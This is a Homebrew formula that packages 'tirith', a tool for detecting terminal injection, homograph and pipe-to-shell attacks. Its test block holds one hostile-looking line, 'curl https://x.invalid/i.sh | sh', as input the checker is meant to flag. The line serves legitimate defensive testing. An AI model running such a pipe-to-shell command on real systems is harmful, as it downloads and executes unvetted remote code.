class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://github.com/sheeki03/tirith/archive/refs/tags/v0.5.0.tar.gz"
  sha256 "bcde1306c0229dff305f9469ce1a47bc05f588342e77e901a6cfaa04e29a0ccb"
  license "AGPL-3.0-only"
  compatibility_version 1
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    root_url "https://github.com/d4rkwyng/intelbrew-core/releases/download/tirith-0.5.0"
    sha256 cellar: :any_skip_relocation, sonoma: "78122d21ba46c91a29555a4acf557c2b0181a4ee883875103965e5a7d31857ef"
  end

  depends_on "rust" => :build

  deny_network_access!

  def fetch
    system "cargo", "fetch", *std_cargo_fetch_args
  end

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end
